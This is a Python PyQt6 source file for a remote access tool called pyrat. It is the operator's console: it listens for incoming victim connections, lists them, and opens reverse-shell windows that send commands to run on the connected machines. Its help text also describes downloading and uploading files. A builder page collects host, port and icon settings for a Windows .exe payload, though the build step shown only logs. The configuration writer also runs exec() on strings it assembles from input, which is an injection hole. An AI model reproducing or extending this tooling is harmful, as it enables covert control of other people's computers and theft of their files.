import sys, time, json, datetime, functools, threading, socket, customSocket, traceback, random
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *
from PyQt6 import uic

#<div>Icons made by <a href="https://www.flaticon.com/authors/gregor-cresnar" title="Gregor Cresnar">Gregor Cresnar</a> from <a href="https://www.flaticon.com/" title="Flaticon">www.flaticon.com</a></div>

class WorkerSignals(QObject):
    finished = pyqtSignal() # create a signal
    result = pyqtSignal(object) # create a signal that gets an object as argument

class Worker(QRunnable):
    def __init__(self, fn, *args, **kwargs):
        super(Worker, self).__init__()
        self.fn = fn # Get the function passed in
        self.args = args # Get the arguments passed in
        self.kwargs = kwargs # Get the keyward arguments passed in
        self.signals = WorkerSignals() # Create a signal class

    @pyqtSlot()
    def run(self): # our thread's worker function
        result = self.fn(*self.args, **self.kwargs) # execute the passed in function with its arguments
        self.signals.result.emit(result)  # return result
        self.signals.finished.emit()  # emit when thread ended

def for_all_methods(decorator, exclude=[]):
    def decorate(cls):
        for attr in cls.__dict__: # there's propably a better way to do this
            if callable(getattr(cls, attr)) and attr not in exclude:
                setattr(cls, attr, decorator(getattr(cls, attr)))
        return cls
    return decorate

def debugConsoleWindow(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):

        cw.addConsoleLogMessage(f"Called {func.__name__} with args {args} and kwargs {kwargs}")
        print(f"Called {func.__name__} with args {args} and kwargs {kwargs}")
        val = func(*args, **kwargs)
    
        return val

    return wrapper

@for_all_methods(debugConsoleWindow)
class PageManager():
    def __init__(self):
        self.pages = {
            "mainPage" : MainPage(),
            "portPage" : PortPage(),
            "settingsPage" : SettingsPage(),
            "selectPlatform" : SelectPlatform(),
            "windowsBuilder" : WindowsBuilder()
        }        

        self.config = self.readConfig()

    def updateConfig(func):

        def wrapper(self, *args, **kwargs):
            pm.config = self.readConfig()
            val = func(self, *args, **kwargs)
            return val

        return wrapper 
    
    def changePage(self, fromPage, toPage, conserve=True):
        
        if (fromPage != None) and conserve:
            fromPage.close()
            

        elif (fromPage != None) and not conserve:
            fromPage.destroy() #TODO : faire ca
            
        time.sleep(0.1)
        self.pages[toPage].show()

    def reloadPage(self, page):
        page.loadUi()

    def readConfig(self):

        with open("./config.pyrat", "r") as f:
            config = json.load(f)
        return config

    def writeConfig(self, changeInput):
        # Example of input : [("defaults:defaultHost", "newDefaultHost")]

        oldConf = self.readConfig()

        with open("./config.pyrat", "w") as f:

            for i in changeInput:
                keys = i[0]
                value = i[1]

                temp = ""

                for key in keys.split(":"):
                    temp += '["' + key + '"]'
                
                exec("oldConf" + temp + "=" + "'" + str(value) + "'")

            json.dump(oldConf, f)
"""
class LesSiganls(QObject):
    sendButtonSig = pyqtSignal()
    boutonAledSig = pyqtSignal()
"""

@for_all_methods(debugConsoleWindow)
class ReverseShellWindow(QMainWindow):
    def __init__(self, parent=None):
        super(ReverseShellWindow, self).__init__(parent) # Call the inherited classes __init__ method
        self.uiPath = "./assets/ui/reverseshellui.ui"
        self.loadUi()

    def addConsoleRSConsoleMessage(self, message):
        t1 = datetime.datetime.now()
        time = "[%s:%s:%s] " % (t1.hour, t1.minute, t1.second)
        self.shellText.append(time + message)

    def helpMenu(self, *args, **kwargs):
        self.addConsoleRSConsoleMessage("Special commands :\n- get <path> <local path> : download file at the provided path\n- put <local path> <path> : upload a file to the specified path\n- help : displays this menu\n- exec <command> : execute a command on the machine and returns output\nIf your input is none of the command above, then it'll be executed as a command on the machine (similar to 'exec')")

    def getCommand(self, *args, **kwargs):
        self.command = self.commandEdit.text()
        self.addConsoleRSConsoleMessage(f">> {self.command}")

        if self.command.lower() == "help":
            self.helpMenu()
        
        elif self.command.lower()[:5] == "exec ":
            toSend = self.command.split("exec ")[1]
            if toSend != "":
                cm.payloadPool.append(f"{self.code}:GETCOMMAND:{toSend}")

        else:
            cm.payloadPool.append(f"{self.code}:GETCOMMAND:{self.command}")
        self.commandEdit.setText("")
            
    def enterPressed(self, *args, **kwargs):
        self.getCommand()
        

    def loadUi(self):
        try:
            uic.loadUi(self.uiPath, self)
            self.commandEdit.returnPressed.connect(self.enterPressed)
            self.sendButton.clicked.connect(self.getCommand)
            self.addConsoleRSConsoleMessage("Use 'help' in order to see what are the custom commands !")
            self.show()

        except Exception as e:
            print(e)
            traceback.print_stack()

class ConsoleWindow(QMainWindow):
    def __init__(self):
        super(ConsoleWindow, self).__init__() # Call the inherited classes __init__ method
        self.uiPath = "./assets/ui/consoleui.ui"
        self.isShowing = True
        self.loadUi()

    def showEvent(self, event):
        self.isShowing = True
    
    def closeEvent(self, event):
        self.isShowing = False
    
    def hideEvent(self, event):
        self.isShowing = False


    def loadUi(self):
        uic.loadUi(self.uiPath, self)
        
        self.model = QStandardItemModel()
        self.show()


    def addConsoleLogMessage(self, message):
        t1 = datetime.datetime.now()
        time = "[%s:%s:%s] " % (t1.hour, t1.minute, t1.second)
        #self.consoleLogMessages.append(time + message)
        #self.consoleLog(self.consoleLogMessages)
        self.logEdit.append(time + message)
        
    def showWin(self):
        self.show()
    
    def hideWin(self):
        self.hide()

@for_all_methods(debugConsoleWindow) #, ["startServer"]
class ConnexionManager():
    def __init__(self):
        print("Hello !")
        try:
            self.clients = []
            self.initialized = False

            self.threadpool = QThreadPool() #    
            self.threadpool.setMaxThreadCount(1024)
            print("Maximum Threads2 : %d" % self.threadpool.maxThreadCount()) #

            self.actionPool = []
            self.payloadPool = []
            self.codelist = [] 

        except Exception as e:
            print(e) 
    
    def threadRunner(self, work):
        worker = Worker(work) # create our thread and give it a function as argument with its args
        self.threadpool.start(worker) # start thread
        return

    def acceptConnections(self, *args, **kwargs):
        try:
            self.index = 0
            cw.addConsoleLogMessage("Waiting for connexions !")
            while True:
                time.sleep(1)
                
                (clientSocket, address) = self.serversocket.accept()
                self.clients.append(clientSocket)
                
                self.threadRunner(lambda: self.clientSocketHandler(clientSocket, self.index))
                self.index += 1

        except Exception as e:
            print(e)
    
    def clientSocketHandler(self, socket, ind):

        # Payload : reverse shell
        def startShell(rsw):

            def sendCommand(comm):
                try:
                    print(f"Sending command ! {comm}")
                    s.ratSend(f"ACTION:{code}:{comm}&")
                    
                except Exception as e:
                    print(e)

            try:
                oui = False
                while not oui:
                    code = "".join([str(random.choice(range(0,10))) for _ in range(16)]) # to be sure x)
                    if code in self.codelist:
                        continue
                    else:
                        self.codelist.append(code)
                        oui = True
                        break

                s.ratSend(f"PAYLOAD:SHELL:CODE={code}&")
                
                rsw.code = code
                rsw.setWindowTitle(f"Reverse shell on {socket.getpeername()[0]}")

                while True:
                    
                    time.sleep(0.5)
                    toDelPayloadPool = []

                    for i in self.payloadPool.copy():
                        if i.split(":")[0] == code:
                            print(f"RECEIVED {i.split(':')[1]} in thread {ind}")
                            toDelPayloadPool.append(i)
                            if i.split(":")[1] == "GETCOMMAND":
                                sendCommand(i.split(":")[2])
                            elif i.split(":")[1] == "OUTPUTSHELL":
                                rsw.addConsoleRSConsoleMessage(i.split(":")[2])

                    for i in range(len(toDelPayloadPool)):

                            toDelPayloadPoolCopy = self.payloadPool.copy()
                            del self.payloadPool[toDelPayloadPoolCopy.index(toDelPayloadPool[i])]
            except Exception as e:
                print(e)
                traceback.print_exc()

        def sendHello():
            s.ratSend("Hello&")

        def listenToClient():
            try:
                while True:
                    print(f"State of payloadPool : {self.payloadPool}")
                    time.sleep(0.5)
                    recv = s.ratReceive(8192, "&").strip("&")
                    self.payloadPool.append(recv)
            except Exception as e:
                print(e)
                stop = True

        try:
            s = customSocket.pyratSocket(socket)
            stop = False
            threading.Thread(target=listenToClient).start()
            while True:

                time.sleep(0.5)
                actionPool = self.actionPool.copy()
                
                # Case payloads
                toDelPool = []

                for i in actionPool:
                    if i[0] == socket:
                        print(f"{i[0]} et {i[1]}")
                        if i[1] == "startShell":
                            threading.Thread(target=startShell, args=(i[2],)).start()
                        elif i[1] == "sendHello":
                            sendHello()
                        else:
                            print("WTF")

                        toDelPool.append(i)

                for i in range(len(toDelPool)):

                    actionCopy = self.actionPool.copy()
                    del self.actionPool[actionCopy.index(toDelPool[i])]
                
                if stop:
                    break

        finally:
            cw.addConsoleLogMessage(f"Lost connexion with {socket.getpeername()}")
            
            del self.clients[self.clients.index(socket)]
            return False

    def startServer(self, *args, **kwargs):
        time.sleep(0.5)
        try:
            self.initialized = True
            self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            self.config = pm.readConfig()
            self.serversocket.bind((self.config["currentSession"]["currentHost"], int(self.config["currentSession"]["currentPort"])))
            self.serversocket.listen(1024)
            self.acceptConnections()

        except Exception as e:
            print(e)

@for_all_methods(debugConsoleWindow)
class PortPage(QMainWindow):
    def __init__(self):
        super(PortPage, self).__init__() # Call the inherited classes __init__ method
        self.uiPath = "./assets/ui/portui.ui"
        self.loadUi()

    def loadUi(self):
        uic.loadUi(self.uiPath, self)
        
        self.startButton.clicked.connect(self.getPort)
        self.portLineEdit.setValidator(QIntValidator())

    def showEvent(self, event, *args):
        self.config = pm.readConfig()
        if self.config["defaults"]["defaultHost"] != "":
            self.hostLineEdit.setText(self.config["defaults"]["defaultHost"])
        else:
            self.hostLineEdit.setText(socket.gethostbyname(socket.gethostname()))
        
        if self.config["defaults"]["defaultPort"] != "":
            self.portLineEdit.setText(self.config["defaults"]["defaultPort"])

    def getPort(self, *args):
        self.port = self.portLineEdit.text()
        self.host = self.hostLineEdit.text()
        if self.port != "" and self.host != "":
            print(f"Got port {self.port}")
            pm.writeConfig([("currentSession:currentPort", str(self.port))])
            pm.writeConfig([("currentSession:currentHost", str(self.host))])
            cw.addConsoleLogMessage(f"Listening on host : {self.host} and port : {self.port}")
            pm.changePage(self, "mainPage")

        else:
            print("Port empty")

@for_all_methods(debugConsoleWindow)
class MainPage(QMainWindow):
    
    def __init__(self):
        super(MainPage, self).__init__() # Call the inherited classes __init__ method
        self.uiPath = "./assets/ui/mainui.ui"
        self.refreshing = False
        self.loadUi()

    def loadUi(self):
        uic.loadUi(self.uiPath, self)

        self.refreshButton.clicked.connect(lambda: self.threadRunner(self.refreshConnexions))
        self.buildButton.clicked.connect(self.build)
        self.settingsButton.clicked.connect(self.settings)

        self.connexionModel = QStandardItemModel()
        self.connexionList.setModel(self.connexionModel)
        
        #### MENU and ACTIONS
        self.menu = QMenu()

        self.refreshAction = self.menu.addAction("Refresh")
        self.shell = self.menu.addAction("Start interactive shell")
        self.sayHello = self.menu.addAction("sayHello")
        self.sayHiHello = self.menu.addAction("sayHiHello")

        ####

        #self.installEventFilter(self)
        
        self.connexionList.customContextMenuRequested.connect(self.showConnexionMenu)

    def eventFilter(self, source, event):
        print(f"Got {source} -> {event}")

    def showConnexionMenu(self, position, *args):
        try:
            if self.refreshing:
                self.refreshAction.setEnabled(False)
            else:
                self.refreshAction.setEnabled(True)

            action = self.menu.exec(QCursor.pos())

            if action == self.refreshAction:
                self.threadRunner(self.refreshConnexions)
            elif action == self.shell:
                sock = cm.clients[self.connexionList.selectedIndexes()[0].row()]
                rsw = ReverseShellWindow(self)
                cm.actionPool.append((sock, "startShell", rsw))
            elif action == self.sayHello:
                sock = cm.clients[self.connexionList.selectedIndexes()[0].row()]
                cm.actionPool.append((sock, "sendHello"))
            elif action == self.sayHiHello:
                sock = cm.clients[self.connexionList.selectedIndexes()[0].row()]
                cm.actionPool.append((sock, "sendHi"))
                cm.actionPool.append((sock, "sendHello"))

        except Exception as e:
            print(e)


    def showEvent(self, event):
        
        if not cm.initialized:
            self.threadpool = QThreadPool() #                                          |
            print("Maximum Threads : %d" % self.threadpool.maxThreadCount()) #  
            self.threadRunner(cm.startServer)
    
    def threadRunner(self, work):
        worker = Worker(work) # create our thread and give it a function as argument with its args
        self.threadpool.start(worker) # start thread

    def refreshConnexions(self, *args):
        print("Refresh !")
        self.refreshing = True
        self.connexionModel.removeRows(0, self.connexionModel.rowCount())
        oui = cm.clients.copy()

        for i in oui:
            self.connexionModel.appendRow(QStandardItem(str(i))) #.setBackground(QBrush(Qt.GlobalColor.red, Qt.BrushStyle.SolidPattern)
        
        self.refreshButton.setEnabled(False)

        for i in range(5,-1,-1):
            self.refreshButton.setText(f"Time remaining before next refresh {i}")
            time.sleep(1)

        self.refreshButton.setText("Refresh Connexions")
        self.refreshButton.setEnabled(True)
        self.refreshing = False

        return

    def build(self, *args):
        print("Build !")
        pm.changePage(self, "selectPlatform")
    
    def settings(self, *args):
        print("Settings !")
        pm.changePage(self, "settingsPage")

@for_all_methods(debugConsoleWindow)
class SelectPlatform(QMainWindow):
    def __init__(self):
        super(SelectPlatform, self).__init__() # Call the inherited classes __init__ method

        self.uiPath = "./assets/ui/selectPlatformui.ui"
        self.loadUi()
    
    def loadUi(self):

        uic.loadUi(self.uiPath, self)

        self.winButton.clicked.connect(self.windows)
        self.androButton.clicked.connect(self.android)
        self.backButton.clicked.connect(self.back)

    def windows(self, *args):

        self.platform = "windows"
        cw.addConsoleLogMessage(f"Selected platform : {self.platform}")
        pm.writeConfig([("values:currentPlatform", self.platform)])
        pm.changePage(self, "windowsBuilder")

    def android(self, *args):

        self.platform = "android"
        cw.addConsoleLogMessage(f"Selected platform : {self.platform}")
        pm.writeConfig([("values:currentPlatform", self.platform)])

    def back(self, *args):
        pm.changePage(self, "mainPage")

@for_all_methods(debugConsoleWindow)
class WindowsBuilder(QMainWindow):
    def __init__(self):
        super(WindowsBuilder, self).__init__() # Call the inherited classes __init__ method
        self.uiPath = "./assets/ui/windowsBuilderui.ui"
        self.loadUi()

    def loadUi(self):
        uic.loadUi(self.uiPath, self)

        self.backButton.clicked.connect(self.back)
        self.portEdit.setValidator(QIntValidator())
        self.iconPathButton.clicked.connect(self.iconFile)
        self.savePathButton.clicked.connect(self.saveFile)
        self.buildButton.clicked.connect(self.build)

        try:
            self.config = pm.readConfig()
            self.hostEdit.setText(self.config["defaults"]["defaultHost"])
            self.portEdit.setText(self.config["defaults"]["defaultPort"])
        except:
            pass

    def saveFile(self, *args):
        fileName, _ = QFileDialog.getSaveFileName(self,"QFileDialog.getSaveFileName()","","EXE (*.exe)")
        self.savePathEdit.setText(fileName)


    def iconFile(self, *args):
        fileName, _ = QFileDialog.getSaveFileName(self,"QFileDialog.getSaveFileName()","","PNG (*.png)")
        self.iconEdit.setText(fileName)
    
    def back(self, *args):
        pm.changePage(self, "selectPlatform")
    
    def build(self, *args):
        pm.writeConfig([("builder:currentSavePath", self.savePathEdit.text()), ("builder:currentHostIp", self.hostEdit.text()), ("builder:currentPort", self.portEdit.text()), ("builder:currentIconPath", self.iconEdit.text())])
        cw.addConsoleLogMessage(f"Started building windows payload with arguments : save path = '{self.savePathEdit.text()}'; host = '{self.hostEdit.text()}'; port = '{self.portEdit.text()}'; icon path = '{self.iconEdit.text()}' !")

    def showEvent(self, event):
        self.config = pm.readConfig()
        self.hostEdit.setText(self.config["defaults"]["defaultHost"])
        self.portEdit.setText(self.config["defaults"]["defaultPort"])

@for_all_methods(debugConsoleWindow)
class SettingsPage(QMainWindow):
    def __init__(self):
        super(SettingsPage, self).__init__() # Call the inherited classes __init__ method

        self.uiPath = "./assets/ui/settingsui.ui"
        self.loadUi()
    
    def loadUi(self):

        uic.loadUi(self.uiPath, self)

        self.backButton.clicked.connect(self.back)
        self.saveButton.clicked.connect(self.save)

        self.defaultPortEdit.setValidator(QIntValidator())

        if cw.isShowing == False:
            
            self.disableLogConsoleBox.setChecked(True)
        else:
            self.disableLogConsoleBox.setChecked(False)

        self.disableLogConsoleBox.stateChanged.connect(self.disableLog)

        try:
            self.setPlaceHolders()
        except:
            pass

    def disableLog(self, *args):
        if self.disableLogConsoleBox.isChecked():
            cw.hideWin()
        else:
            cw.showWin()

    def save(self, *args):

        self.defaultHost = self.defaultHostEdit.text()
        self.defaultPort = self.defaultPortEdit.text()

        pm.writeConfig([("defaults:defaultHost", self.defaultHost), ("defaults:defaultPort", self.defaultPort)])

        cw.addConsoleLogMessage(f"Set default host to : '{self.defaultHost}'; and default port to : '{self.defaultPort}'")

        pm.reloadPage(self)


    def setPlaceHolders(self):
        self.defaultHostEdit.setPlaceholderText(pm.config["defaults"]["defaultHost"])
        self.defaultPortEdit.setPlaceholderText(str(pm.config["defaults"]["defaultPort"]))
    
    def showEvent(self, event):
        self.setPlaceHolders()
        if cw.isShowing == False:
            
            self.disableLogConsoleBox.setChecked(True)
        else:
            self.disableLogConsoleBox.setChecked(False)
    
    def back(self, *args):
        pm.changePage(self, "mainPage")


def startConnexionManager():
    global cm # Only global variable I swear
    cm = ConnexionManager()

if __name__ == "__main__":
    try:
        app = QApplication(sys.argv)

        cw = ConsoleWindow()
        cw.addConsoleLogMessage("Started !")

        pm = PageManager()
        cw.addConsoleLogMessage("Created pm instance")

        t1 = threading.Thread(target=startConnexionManager)
        t1.start()

        pm.changePage(None, "portPage")

        try:
            
            sys.exit(app.exec())
            t1.join()
        except:
            print("Close !")
            t1.join()
    finally:
        traceback.print_exc()